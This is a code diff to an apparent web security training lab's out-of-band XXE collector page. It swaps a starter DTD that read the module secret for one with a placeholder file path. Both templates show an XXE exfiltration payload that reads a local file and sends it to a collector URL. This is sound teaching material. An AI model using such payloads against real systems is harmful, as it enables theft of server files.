@@ -83,7 +83,7 @@ router.get('/collector', (req, res) => {
     .map((e) => `
     <tr><td>${esc(e.time)}</td><td>${esc(e.ip)}</td><td><code>${esc(e.d)}</code></td></tr>`).join('')
     || '<tr><td colspan="3"><i>no pingbacks from your session yet</i></td></tr>';
-  const dtdTemplate = `<!ENTITY % file SYSTEM "file://${SECRET_ABS}">\n<!ENTITY pingback SYSTEM "${base}/xxe/collector/log?d=%file;">`;
+  const dtdTemplate = `<!ENTITY % file SYSTEM "file:///PATH/TO/A/FILE">\n<!ENTITY pingback SYSTEM "${base}/xxe/collector/log?d=%file;">`;
   res.send(page('OOB Collector', `
     <h2>Out-of-band collector</h2>
     ${brief('What is this?', `
@@ -104,8 +104,9 @@ router.get('/collector', (req, res) => {
       <button class="clay-btn clay-btn-primary" type="submit">Host this DTD</button>
     </form>
     <p class="dim">Currently hosted at <code>${esc(dtdUrl)}</code> (your session's own slot: other students have their own)</p>
-    <p>Starter DTD (reads the module secret into <code>%file;</code>, then pings this
-    collector back with it in the URL):</p>
+    <p>DTD shape (your hosted DTD needs one declaration that reads a file into
+    <code>%file;</code>, and a second that pings this collector back with it in the URL;
+    the target path is yours to supply):</p>
     <pre><code>${esc(dtdTemplate)}</code></pre>
     <h3>2. Pingback log</h3>
     <table><tr><th>Time</th><th>From</th><th>d=</th></tr>${rows}</table>
